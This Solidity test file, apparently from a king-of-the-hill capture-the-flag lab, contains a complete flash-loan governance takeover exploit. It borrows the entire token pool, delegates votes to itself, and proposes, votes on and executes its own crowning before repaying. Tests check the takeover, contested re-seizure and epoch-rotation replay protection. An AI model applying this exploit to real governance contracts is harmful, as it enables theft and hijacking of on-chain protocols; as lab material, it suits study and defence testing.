// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/Setup.sol";
import "../src/GovToken.sol";
import "../src/Governor.sol";
import "../src/Throne.sol";
import "../src/FlashLender.sol";

// The reference takeover: one transaction. Flash-borrow the whole gov-token pool, delegate to
// self so live voting power = the borrowed stake, propose crown(self, tag), vote (live power
// clears quorum), execute, repay.
contract Coup is IFlashBorrower {
    Setup public setup;
    bytes public tag;

    constructor(address s) {
        setup = Setup(s);
    }

    function pwn(bytes calldata _tag) external {
        tag = _tag;
        FlashLender l = setup.lender();
        l.flashLoan(l.maxFlashLoan(), address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        GovToken tok = setup.token();
        Governor gov = setup.governor();
        Throne thr = setup.throne();
        tok.delegate(address(this));
        bytes memory data = abi.encodeWithSelector(Throne.crown.selector, address(this), tag);
        uint256 id = gov.propose(address(thr), data, gov.epochNonce());
        gov.castVote(id);
        gov.execute(id);
        tok.transfer(address(setup.lender()), amount); // repay
    }
}

contract TakeoverTest {
    bytes constant TAG_A = hex"6b6f74685f7465616d5f41"; // "koth_team_A"
    bytes constant TAG_B = hex"6b6f74685f7465616d5f42"; // "koth_team_B"

    function test_flashloan_takeover() public {
        Setup s = new Setup(address(this));
        Coup coup = new Coup(address(s));
        coup.pwn(TAG_A);
        Throne t = s.throne();
        require(t.king() == address(coup), "not crowned");
        require(keccak256(t.currentTag()) == keccak256(TAG_A), "wrong tag");
        // flash loan repaid: pool whole again
        require(s.token().balanceOf(address(s.lender())) == s.SUPPLY(), "pool not repaid");
    }

    function test_contested_reseize() public {
        Setup s = new Setup(address(this));
        Coup a = new Coup(address(s));
        Coup b = new Coup(address(s));
        a.pwn(TAG_A);
        require(keccak256(s.throne().currentTag()) == keccak256(TAG_A), "A not king");
        b.pwn(TAG_B); // rival re-seizes the same shared slot
        require(keccak256(s.throne().currentTag()) == keccak256(TAG_B), "B did not re-seize");
    }

    function test_epoch_rotation_breaks_replay() public {
        Setup s = new Setup(address(this));
        Governor gov = s.governor();
        uint256 oldEpoch = gov.epochNonce();
        // pre-stage a proposal in the current epoch, then the round rotates before execute
        FlashLenderStager stager = new FlashLenderStager(address(s), oldEpoch, TAG_A);
        uint256 id = stager.stage();          // proposes + votes in the old epoch (quorum met)
        gov.rotateEpoch();                     // round boundary
        (bool ok, ) = address(gov).call(abi.encodeWithSelector(Governor.execute.selector, id));
        require(!ok, "stale-epoch proposal must NOT execute after rotation");
        // a fresh takeover in the new epoch works
        Coup c = new Coup(address(s));
        c.pwn(TAG_B);
        require(keccak256(s.throne().currentTag()) == keccak256(TAG_B), "fresh-epoch takeover failed");
    }
}

// stages a real (quorum-passing) proposal+vote in one epoch but does NOT execute, to prove
// the round rotation invalidates it.
contract FlashLenderStager is IFlashBorrower {
    Setup public setup;
    uint256 public epoch;
    bytes public tag;
    uint256 public stagedId;

    constructor(address s, uint256 e, bytes memory t) {
        setup = Setup(s);
        epoch = e;
        tag = t;
    }

    function stage() external returns (uint256) {
        FlashLender l = setup.lender();
        l.flashLoan(l.maxFlashLoan(), address(this), "");
        return stagedId;
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        GovToken tok = setup.token();
        Governor gov = setup.governor();
        tok.delegate(address(this));
        bytes memory data = abi.encodeWithSelector(Throne.crown.selector, address(this), tag);
        stagedId = gov.propose(address(setup.throne()), data, epoch);
        gov.castVote(stagedId);
        tok.transfer(address(setup.lender()), amount);
    }
}
